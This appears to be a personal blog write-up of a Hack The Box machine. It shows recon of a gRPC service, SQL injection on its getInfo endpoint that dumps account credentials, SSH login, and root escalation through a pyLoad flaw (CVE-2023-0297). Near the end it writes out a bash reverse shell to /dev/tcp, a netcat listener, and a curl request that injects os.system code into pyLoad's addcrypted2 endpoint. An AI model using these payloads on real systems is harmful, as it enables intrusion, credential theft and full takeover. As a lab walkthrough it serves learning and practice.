---
layout: post
title:  "SQL Injection on gRPC Endpoint AND exploiting a pyLoad vulnerability for Privilege Escalation"
author: dz
categories: [HTB]
tags: [web, ctf, linux_infrastructure, sqli]
image: assets/images/018d6f13-5166-7fb6-92e0-a2ce31011286/thumbnail.png
featured: true
---

gRPC is a framework that works with **Remote Procedural Calls**. It is an opensource created by Google that uses *protocol buffers* for serialization and HTTP/2 for transport.

### Introduction
This is the first time I have encountered gRPC and to be honest, this is my first time hearing about it. Well, of course, I am just a **n00b1e** who has **potato** skills in the field of cybersecurity. However, that's not gonna stop me from sharing what I have learned and unto the journey!

### Recon
First I run nmap scan with the following command: **`nmap -sC -sV -p- -Pn -vv <ip>`**.
The result of the nmap scan are the following: 
```http
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91:bf:44:ed:ea:1e:32:24:30:1f:53:2c:ea:71:e5:ef (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChKXbRHNGTarynUVI8hN9pa0L2IvoasvTgCN80atXySpKMerjyMlVhG9QrJr62jtGg4J39fqxW06LmUCWBa0IxGF0thl2JCw3zyCqq0y8+hHZk0S3Wk9IdNcvd2Idt7SBv7v7x+u/zuDEryDy8aiL1AoqU86YYyiZBl4d2J9HfrlhSBpwxInPjXTXcQHhLBU2a2NA4pDrE9TxVQNh75sq3+G9BdPDcwSx9Iz60oWlxiyLcoLxz7xNyBb3PiGT2lMDehJiWbKNEOb+JYp4jIs90QcDsZTXUh3thK4BDjYT+XMmUOvinEeDFmDpeLOH2M42Zob0LtqtpDhZC+dKQkYSLeVAov2dclhIpiG12IzUCgcf+8h8rgJLDdWjkw+flh3yYnQKiDYvVC+gwXZdFMay7Ht9ciTBVtDnXpWHVVBpv4C7efdGGDShWIVZCIsLboVC+zx1/RfiAI5/O7qJkJVOQgHH/2Y2xqD/PX4T6XOQz1wtBw1893ofX3DhVokvy+nM=
|   256 84:86:a6:e2:04:ab:df:f7:1d:45:6c:cf:39:58:09:de (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPqhx1OUw1d98irA5Ii8PbhDG3KVbt59Om5InU2cjGNLHATQoSJZtm9DvtKZ+NRXNuQY/rARHH3BnnkiCSyWWJc=
|   256 1a:a8:95:72:51:5e:8e:3c:f1:80:f5:42:fd:0a:28:1c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBG1KtV14ibJtSel8BP4JJntNT3hYMtFkmOgOVtyzX/R
50051/tcp open  unknown syn-ack
```

Two ports were identified during the scan: 22 and 50051. I know that the port 22 is for ssh, but I have no idea what service is running on port 50051. I did some quckie with google and I found out that port 50051 is the default port of gRPC (<a href="https://documentation.softwareag.com/webmethods/compendiums/v10-11/C_API_Management/index.html#page/api-mgmt-comp/to-grpc_configuration_7.html" target="_blank">*to read more*</a>).

As I have said earlier, this is my first time to encounter **gRPC**. So I spent some time researching about it and finding tools which could be used to interact with it. I found couple of tools which are handy, but in this case, I'd be using the tool **grpcurl** (<a href="https://github.com/fullstorydev/grpcurl" target="_blank">*github*</a>).

Using the tool, I used the command: **`./grpcurl -plaintext <IP>:<PORT> list`**

<img src="../../blog/assets/images/018d6f13-5166-7fb6-92e0-a2ce31011286/sc2.png">

Hey, Look at that! there's something called "SimpleApp". That could be **juicy~licious**.  So I checked it further with the following command: **`./grpcurl -plaintext <IP>:<PORT> list SimpleApp`**

<img src="../../blog/assets/images/018d6f13-5166-7fb6-92e0-a2ce31011286/sc 3.png">

The results are SimpleApp.LoginUser, SimpleApp.RegisterUser, and SimpleApp.getInfo. 

I know these things are totally **juicy~licious**. However, I'm kinda confuse on how to approach this. So I went with another tool that I found which is **grpcui** (<a href="https://github.com/fullstorydev/grpcui" target="_blank">*github*</a>).

This tool does the same thing with the previous tool that I used, but it has a UI. 

I ran the command on the terminal: **`./grpcui -plaintext <IP>:<PORT>`**

<img src="../../blog/assets/images/018d6f13-5166-7fb6-92e0-a2ce31011286/sc 1.png">

Below is the UI:
<img src="../../blog/assets/images/018d6f13-5166-7fb6-92e0-a2ce31011286/sc 4.png">

Now that I have UI to interact with the gRPC endpoint, it would be easier to navigate and invoke some functions.

Of course, we it would be cool if we have a user. So I have created a user:

<img src="../../blog/assets/images/018d6f13-5166-7fb6-92e0-a2ce31011286/sc 5.png">

Response:

<img src="../../blog/assets/images/018d6f13-5166-7fb6-92e0-a2ce31011286/sc 6.png">

Time to login with the user account I created. 

Aaaanddd. hmmmmm. What do we have here.
<img src="../../blog/assets/images/018d6f13-5166-7fb6-92e0-a2ce31011286/sc 7.png">

It showed the ID of my newly registered account and below, under the **Response Trailers**, is a token. Then I remember there is the 3rd function which is **getInfo**

<img src="../../blog/assets/images/018d6f13-5166-7fb6-92e0-a2ce31011286/sc 8.png">

It requires ID, so I input the ID of my account. Unfortunately, it returned an error about missing token header.

<img src="../../blog/assets/images/018d6f13-5166-7fb6-92e0-a2ce31011286/sc 9.png">

Since I have a token from earlier, I used that and it still gave the same error. Hence, I fired up Burpsuite and intercepted the request. I found out that I should remove the **b'** from the cookie. I sent this request and got the message "Will update soon".

<img src="../../blog/assets/images/018d6f13-5166-7fb6-92e0-a2ce31011286/sc 10.png">

looking at the POST request from burp I suddenly realized why not try for some SQL injection, so I added an apostrophre in the **'id'** parameter and got an error.

**Request:**

<img src="../../blog/assets/images/018d6f13-5166-7fb6-92e0-a2ce31011286/sc 10.1.png">

**Response:**

<img src="../../blog/assets/images/018d6f13-5166-7fb6-92e0-a2ce31011286/sc 11.png">
<hr>

Based from the error, I knew that this is a SQL injection. I tried double checking:
**Request:**

<img src="../../blog/assets/images/018d6f13-5166-7fb6-92e0-a2ce31011286/sc 12.png">

**Response:**

<img src="../../blog/assets/images/018d6f13-5166-7fb6-92e0-a2ce31011286/sc 13.png">
<hr>

### Tender Juicy Part
So yeah, it is confirmed. Then after playing with different payloads, I went with this and got a table named **accounts**
**Payload:**

<img src="../../blog/assets/images/018d6f13-5166-7fb6-92e0-a2ce31011286/sc 14.png">

**Response:**

<img src="../../blog/assets/images/018d6f13-5166-7fb6-92e0-a2ce31011286/sc 15.png">

and since we got a table name, next things to do is to enumerate the columns.

<img src="../../blog/assets/images/018d6f13-5166-7fb6-92e0-a2ce31011286/sc 16.png">


<img src="../../blog/assets/images/018d6f13-5166-7fb6-92e0-a2ce31011286/sc 17.png">

and we have now username and password columns. Time to retrieve those accounts.

<img src="../../blog/assets/images/018d6f13-5166-7fb6-92e0-a2ce31011286/sc 18.png">


<img src="../../blog/assets/images/018d6f13-5166-7fb6-92e0-a2ce31011286/sc 19.png">

And now we have the **TENDER JUICY** credentials.

I am not sure where to use the admin credentials and I am not even sure if it is useful, but the other one is somewhat **juicy~licious**. I thought about SSH since port 22 was open. I gave it a try and boom. 

<img src="../../blog/assets/images/018d6f13-5166-7fb6-92e0-a2ce31011286/sc 20.png">

### Privilege Escalation
After doing some extensive research of on how to escalate my privileges on this machine, not to mention the tons of coffees I drank to keep me awake on this journey, it's time for the another quest to gain root access. (*To save us a lot of time, I didn't include how I messed up multiple times and found myself in a rabbit hole*)

Unto the quest of escalating our privileges! I ran the command: `netstat -tlnp`
<img src="../../blog/assets/images/018d6f13-5166-7fb6-92e0-a2ce31011286/sc 21.png">

It appears that port 8000 is active. I thought about port forwarding it, I was trying to do that using chisel, but for some freaking and annoying reason I can't make it to work properly. So I did this instead: `ssh -L 9546:127.0.0.1:8000 sau@10.10.11.214 -N`. 

I'm not saying it's a downgrade, but I really wanna use chisel. Well, anyways. Continuing the journey~

So here's what is running on port 8000.
<img src="../../blog/assets/images/018d6f13-5166-7fb6-92e0-a2ce31011286/sc 22.png">

PyLoad.. hmmm... I have no idea what that was and it was my first time to encounter that. Hence, I did some quickie with google again and yeah. It appears that pyLoad is an open-source download manager (<a href="https://pyload.net/" target="_blank">*read more*</a>).
This is where it gets interesting. After doing some research and browsing in the **ocean of knowledge** (*the internet*), I found out that there is an existing exploit for pyload which is the **CVE-2023-0297**. 

Hoorayy~

After reading about it, time to execute the final steps on this journey of ours! I created a bash script where it contained a payload that listens to my machine:
```http
#!/bin/bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

I also setup a listener on my machine: `nc -lvnp 4588`

Sooooo, this is final payload to finish the journey and to finally conquer the quest:
```http
curl -i -s -k -X $'POST' \  
--data-binary $'jk=pyimport%20os;os.system(\"bash%20/tmp/dracozona.sh\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \  
$'http://127.0.0.1:8000/flash/addcrypted2'
```

After executing this payload, we have gained a root access!!!
<img src="../../blog/assets/images/018d6f13-5166-7fb6-92e0-a2ce31011286/sc 23.png">

<img src="../../blog/assets/images/018d6f13-5166-7fb6-92e0-a2ce31011286/sc 24.png">

And this is where the journey ends~